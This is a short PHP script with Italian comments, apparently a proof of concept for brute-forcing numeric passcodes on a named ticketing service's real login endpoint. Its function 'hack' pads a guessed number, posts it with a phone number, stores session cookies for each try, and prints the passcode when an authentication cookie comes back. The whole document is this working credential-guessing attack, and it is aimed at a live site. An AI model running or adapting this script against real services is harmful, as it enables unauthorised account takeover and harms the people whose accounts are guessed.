<?php

function hack($i, $numero_tel, $cifre)
{
    $number = str_pad($i, $cifre, "0", STR_PAD_LEFT); // Metodo
    echo $number . "\t"; // Stampo a video il passcode che sta per provare

    $url = "https://my.ticketsms.it/action/login.php"; // Endpoint Url API
    $data = ["phone" => $numero_tel, "password" => $number]; // Array contenente dati

    $cookie_file = "./" . $numero_tel . "/" . $number . ".txt"; // Location file Cookie

    $options = [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data), // Array delle credenziali
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_COOKIEJAR => $cookie_file, // salvataggio cookie
    ];

    $ch = curl_init(); // Inizializzazione della richiesta Curl
    curl_setopt_array($ch, $options); // Inserimento delle opzioni per la richiesta
    $response = curl_exec($ch); // Esecuzione della richiesta e assegnato valore della risposta ad una variabile

    // Impostato il file cookie come file di input per i cookie
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);

    // Ottenuto l'elenco dei cookie
    $cookies = curl_getinfo($ch, CURLINFO_COOKIELIST);

    // Controllo presenza del cookie "ts_JWT_PROMOTER_AUTH"
    /*

    È plausibile che l'iterazione in basso verifichi solo la presenza di un cookie archiviato attraverso COOKIEJAR. 
    Pertanto, in caso di altri siti, è necessario verificare la validità di questo sistema. 
    Nel caso specifico, il cookie "ts_JWT_PROMOTER_AUTH" viene archiviato in questo modo e questa iterazione è pertinente al nostro caso.

*/
    if (isset($cookies[0])) {
        echo "Ecco la passcode di " . $numero_tel . ": " . $data["password"]; // Stampa a video la password
    }
}

/* La i parametri attuali sono 

Parametro	                                                Tipo di dato
passcode     	                                            Intero
numero di telefono	                                        Stringa
numero di cifre per riempire le caselle(00001)	            Intero

Richiamo Funzione per eseguire il codice
*/
hack(456, "3999999999", 5);
